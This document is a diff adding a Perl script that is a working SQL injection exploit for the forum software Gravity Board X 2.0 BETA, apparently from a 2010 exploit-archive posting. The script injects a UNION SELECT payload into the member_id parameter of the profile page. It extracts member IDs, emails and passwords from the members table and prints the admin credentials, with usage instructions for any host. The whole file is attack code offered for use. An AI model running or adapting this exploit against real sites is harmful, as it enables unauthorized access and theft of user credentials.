@@ -1,0 +1,36 @@
+#!/usr/bin/perl 
+# Exploit Title: Gravity Board X 2.0 BETA (Public Release 3) SQL INJECTION
+# Date: 26.02.2010
+# Author: Ctacok
+# Software Link: http://www.gravityboardx.com/
+# Version: 2.0 BETA (Public Release 3)
+# Tested on: Windows SP 3 
+# Code : [exploit code]
+
+use LWP::Simple;
+print "\n";
+print "##############################################################\n";
+print "# Gravity Board X 2.0 BETA (Public Release 3) SQL INJECTION  #\n";
+print "# Author: Ctacok  (Russian)                                  #\n";
+print "# Blog : www.Ctacok.ru                                       #\n";
+print "# Special for Antichat (forum.antichat.ru) and xakep.ru      #\n";
+print "# Big Thanks to Slip :)                                      #\n";
+print "# Require : Magic_quotes = Off                               #\n";
+print "##############################################################\n";
+if (@ARGV < 2)
+{
+print "\n Usage: exploit.pl [host] [path] ";
+print "\n EX : exploit.pl www.localhost.com /path/ prefix \n\n";
+exit;
+}
+$host=$ARGV[0];
+$path=$ARGV[1];
+$prefix=$ARGV[2];   #  PREFIX TABLES, Default: gbx
+$vuln = "-2'+union+select+concat(0x3a3a3a,memberid,0x3a,email,0x3a,pw,0x3a3a3a)+from+".$prefix."_members";
+$doc = get($host.$path."index.php?action=viewprofile&member_id=".$vuln."+--+");
+if ($doc =~ /:::(.+):(.+):(.+):::/){
+        print "\n[+] Admin id: : $1";
+		print "\n[+] Admin email: $2";
+		print "\n[+] Admin password: $3";
+}
+
